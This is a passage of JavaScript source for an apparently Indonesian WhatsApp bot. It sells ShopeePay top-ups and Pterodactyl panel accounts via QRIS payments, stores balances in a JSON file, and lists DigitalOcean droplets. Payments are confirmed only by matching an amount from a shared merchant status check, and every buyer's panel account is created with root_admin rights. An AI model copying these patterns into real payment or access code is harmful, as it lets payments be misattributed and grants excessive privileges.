        title: `💰 Rp${parseInt(nominal).toLocaleString()} ➝ Rp${hargaTetap[nominal].toLocaleString()}`,
        id: `.pilih-nominal-shopeepay ${nominal}`
    }));

    // Menyusun daftar harga tetap dalam bentuk teks
    let hargaTetapList = Object.entries(hargaTetap)
        .map(([nominal, harga]) => `💰 *Rp${parseInt(nominal).toLocaleString()}* ➝ *Rp${harga.toLocaleString()}*`)
        .join("\n");

    return await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname} 🚀`,
        buttons: [
          { 
            buttonId: `.owner`, 
            buttonText: { displayText: '👨‍💻 Hubungi Developer' }, 
            type: 1 
          },
          {
            buttonId: 'action',
            buttonText: { displayText: '💵 Pilih Nominal' },
            type: 4,
            nativeFlowInfo: {
              name: 'single_select',
              paramsJson: JSON.stringify({
                title: '📊 Pilih Nominal Top-up',
                sections: [
                  {
                    title: '📜 Daftar Nominal',
                    rows: amounts
                  }
                ]
              })
            }
          }
        ],
        headerType: 1,
        viewOnce: true,
        image: { url: global.image.reply },
        caption: `📲 *Nomor ShopeePay:* *${nomorShopeePay}*\n\n📌 *Daftar Harga Tetap:*\n${hargaTetapList}\n\n🔹 *Silakan pilih jumlah top-up beserta harga dari tombol di bawah ini.*`,
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
        },
      }, { quoted: qtext2 });
}

case 'pilih-nominal-shopeepay': {  
    if (!db.users[m.sender].temp_nomorShopeePay)  
        return m.reply("⚠️ Silakan masukkan nomor ShopeePay terlebih dahulu dengan perintah: *.topup-shopeepay <nomor_shopeepay>*");

    let jumlahTopup = parseInt(text);
    let hargaTetap = {
        1000: 1500,
        5000: 7000,
        10000: 12000,
        20000: 23000,
        25000: 28000,
        50000: 53000,
        75000: 78000,
        100000: 105000
    };

    if (!hargaTetap[jumlahTopup])  
        return m.reply("❌ Nominal tidak tersedia! Pilih dari daftar yang diberikan.");

    let nomorShopeePay = db.users[m.sender].temp_nomorShopeePay;
    let totalPembayaran = hargaTetap[jumlahTopup];

    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${totalPembayaran}&codeqr=${global.qrisOrderKuota}`);

    const teks3 = `  
🎯 *INFORMASI PEMBAYARAN*  

🆔 *ID:* ${get.data.result.transactionId}  
📱 *Nomor ShopeePay:* ${nomorShopeePay}  
💸 *Jumlah Top-up:* Rp${jumlahTopup.toLocaleString()}  
💰 *Total Pembayaran:* Rp${totalPembayaran.toLocaleString()}  
⏳ *Expired:* 5 menit  

⚠️ *Note:*  
🔹 QRIS pembayaran hanya berlaku dalam 5 menit! Jika sudah melewati waktu, pembayaran dinyatakan tidak valid.  
🔹 Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.  

🔄 Ketik *.batalbeli* untuk membatalkan transaksi.  
`;

    let msgQr = await conn.sendMessage(m.chat, {  
        footer: `© 2025 ${botname} 🚀`,  
        buttons: [  
            {  
                buttonId: `.batalbeli`,  
                buttonText: { displayText: '❌ Batalkan Pembelian' },  
                type: 1  
            }  
        ],  
        headerType: 1,  
        viewOnce: true,  
        image: { url: get.data.result.qrImageUrl },   
        caption: teks3,  
        contextInfo: {  
            mentionedJid: [m.sender]  
        },  
    });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {  
        msg: msgQr,   
        chat: m.sender,  
        idDeposit: get.data.result.transactionId,   
        amount: totalPembayaran.toString(),  
        nomorShopeePay: nomorShopeePay,  
        topup: jumlahTopup.toString(),  
        exp: function () {  
            setTimeout(async () => {  
                if (db.users[m.sender].status_deposit == true) {  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "⚠️ QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });  
                    db.users[m.sender].status_deposit = false;  
                    await clearInterval(db.users[m.sender].saweria.exp);  
                    delete db.users[m.sender].saweria;  
                }  
            }, 300000);  
        }  
    };

    await db.users[m.sender].saweria.exp();  

    while (db.users[m.sender].status_deposit == true) {  
        await sleep(8000);  
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);  
        const req = await resultcek.data;  

        if (req?.amount == db.users[m.sender].saweria.amount) {  
            db.users[m.sender].status_deposit = false;  
            await clearInterval(db.users[m.sender].saweria.exp);  
            await conn.sendMessage(db.users[m.sender].saweria.chat, {  
                text: `  
✅ *PEMBAYARAN BERHASIL DITERIMA!*  

🆔 *ID:* ${db.users[m.sender].saweria.idDeposit}  
📱 *Nomor ShopeePay:* ${db.users[m.sender].saweria.nomorShopeePay}  
💸 *Jumlah Top-up:* Rp${jumlahTopup.toLocaleString()}  
💰 *Total Pembayaran:* Rp${totalPembayaran.toLocaleString()}  

🚀 *NOTE:*  
Jika sudah transfer, segera hubungi developer kami untuk mengisi saldo Anda! 🛠️  
`}, { quoted: db.users[m.sender].saweria.msg });  

            await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });  
            delete db.users[m.sender].saweria;  
        }  
    }  
}  
break;

case 'topup': {
  const amounts = [];
  for (let i = 1000; i <= 1000000; i += 500) {
    amounts.push({ title: `${i}`, id: `.deposit ${i}` });
  }

  // Sending the message with the developer button and topup interactive buttons
  await conn.sendMessage(m.chat, {
    footer: `© 2025 ${botname}`,
    buttons: [
      { 
        buttonId: `.owner`, 
        buttonText: { displayText: 'Hubungi Developer' }, 
        type: 1 
      },
      {
        buttonId: 'action',
        buttonText: { displayText: 'Pilih Jumlah Nya' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'Pilih Jumlah Nya',
            sections: [
              {
                title: 'List Jumlah',
                rows: amounts
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    image: { url: global.image.reply },
    caption: "\n```[ ! ] Penting : Wajib kirimkan bukti transfer demi keamanan bersama```\n",
    contextInfo: {
      isForwarded: true, 
      mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
    },
  }, { quoted: qtext2 });
  }
  break;

case 'saldoorkut': {
    try {
        const fs = require('fs');
        const usersFilePath = 'source/users.json';
        let usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));

        const userNumber = `${m.sender}`;
        let user = usersData.find(user => user.nomer === userNumber);

        if (user) {
            const balanceText = `💰 *SALDO ANDA:*\n\n📱 Nomor: ${user.nomer}\n💳 Saldo: Rp. ${user.balance}`;
            await conn.sendMessage(m.chat, { text: balanceText }, { quoted: qtext });
        } else {
            await conn.sendMessage(m.chat, { text: '⚠️ Anda belum memiliki saldo. Silakan lakukan pengisian saldo terlebih dahulu.' }, { quoted: qtext });
        }
    } catch (error) {
        console.error('Error memeriksa saldo:', error);
        m.reply('❌ Gagal memeriksa saldo.');
    }
}
break;

case 'deposit': {
    if (!text) return m.reply(`⚠️ Masukkan nominal, contoh: ${command} 1000`);
    const amount = parseInt(text);
    if (isNaN(amount)) return m.reply(`🚫 Nominal tidak valid. Pastikan hanya angka, contoh: ${prefix + command} 1000`);

    const UrlQr = global.qrisOrderKuota;
    const fee = Math.floor(Math.random() * 101); // Biaya acak antara 0 - 100
    const totalAmount = amount + fee;

    try {
        // Membuat QRIS
        const pay = await (await fetch(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)).json();

        const expirationTime = new Date(pay.result.expirationTime);
        const timeLeft = Math.max(0, Math.floor((expirationTime - new Date()) / 60000));
        const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
        const hours = expireTimeJakarta.getHours().toString().padStart(2, '0');
        const minutes = expireTimeJakarta.getMinutes().toString().padStart(2, '0');
        const formattedTime = `${hours}:${minutes}`;

        const tek = `✨ *BERIKUT DETAIL PEMBAYARAN* ✨\n\n🆔 *ID TRANSAKSI:* ${pay.result.transactionId}\n💳 *JUMLAH TRANSAKSI:* Rp. ${totalAmount}\n⏰ *BATAS WAKTU PEMBAYARAN:* ${formattedTime} WIB\n\n✅ Silahkan scan QRIS di atas untuk pembayaran.`;
        await conn.sendMessage(m.chat, { image: { url: `${pay.result.qrImageUrl}` }, caption: `${tek}` }, { quoted: qtext });

        const apiUrl = `https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`;
        let isTransactionComplete = false;
        const maxWaitTime = 5 * 60 * 1000; // Waktu tunggu maksimal 5 menit
        const startTime = new Date().getTime();

        while (!isTransactionComplete && new Date().getTime() - startTime < maxWaitTime) {
            try {
                const response = await fetch(apiUrl);
                const result = await response.json();

                if (result && result.amount && parseInt(result.amount) === totalAmount) {
                    isTransactionComplete = true;

                    // Simpan data pengguna ke file JSON
                    const fs = require('fs');
                    const usersFilePath = 'source/users.json';
                    let usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));

                    const userNumber = `${m.sender}`;
                    let user = usersData.find(user => user.nomer === userNumber);

                    if (user) {
                        user.balance = (parseInt(user.balance) || 0) + amount;
                    } else {
                        user = { nomer: userNumber, balance: amount };
                        usersData.push(user);
                        await conn.sendMessage(m.chat, { text: '🎉 Akun Anda telah terdaftar otomatis karena tidak ditemukan di sistem. Selamat menggunakan layanan kami!' }, { quoted: qtext });
                    }

                    fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
                    const notification = `✅ *PEMBAYARAN ANDA SELESAI!*\n\n🆔 *ID TRANSAKSI:* ${pay.result.transactionId}\n💰 *JUMLAH DITAMBAHKAN:* Rp. ${amount}\n🎊 *PEMBAYARAN BERHASIL DITERIMA.*`;
                    await conn.sendMessage(m.chat, { text: notification }, { quoted: qtext });
                }
            } catch (error) {
                console.error('Error memeriksa status transaksi:', error);
            }

            if (!isTransactionComplete) {
                await new Promise(resolve => setTimeout(resolve, 10000)); // Tunggu 10 detik sebelum cek ulang
            }
        }

        if (!isTransactionComplete) {
            const expiredText = `⏳ *WAKTU PEMBAYARAN TELAH HABIS!*\n\n⚠️ Transaksi Anda telah melebihi batas waktu untuk melakukan pembayaran. Silakan coba lagi dengan membuat transaksi baru.`;
            await conn.sendMessage(m.chat, { text: expiredText }, { quoted: qtext });
        }

    } catch (error) {
        console.error('Error membuat QRIS atau memeriksa status:', error);
        m.reply('❌ Gagal membuat atau memeriksa pembayaran.');
    }
}
break;

case 'buyadp': {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case 'buyadp-v2': {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domainV2}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case 'buyownpnl': {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "30000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Owner Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Owner Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Owner Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}
* ${linkadp}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case 'buyptpnl': {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "35000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Pt Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Pt Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Pt Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}
* ${linkadp}
* Minta Akun Keduanya Ke Developer Kami !!


*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'batalbeli': {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await conn.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listdropletall': {
    if (!isCreator) return Reply(mess.owner);
    try {
        const getDroplets = async (apiToken) => {
            try {
                const response = await fetch('https://api.digitalocean.com/v2/droplets', {
                    headers: {
                        Authorization: "Bearer " + apiToken
                    }
                });
                const data = await response.json();
                return data.droplets || [];
            } catch (err) {
                Reply('Error fetching droplets: ' + err);
                return [];
            }
        };

        // Mengambil droplets dari kedua akun
        Promise.all([
            getDroplets(global.apiDigitalOcean),
            getDroplets(global.apiDigitalOcean2)
        ]).then(([droplets1, droplets2]) => {
            let mesej = `List semua droplet DigitalOcean\n\n`;

            // List dari akun pertama
            mesej += `===== listdroplet 1 =====\n`;
            if (droplets1.length === 0) {
                mesej += 'Tidak ada droplet yang tersedia di akun pertama!\n\n';
            } else {
                droplets1.forEach(droplet => {
                    const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
                    const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                    mesej += `Droplet ID: ${droplet.id}
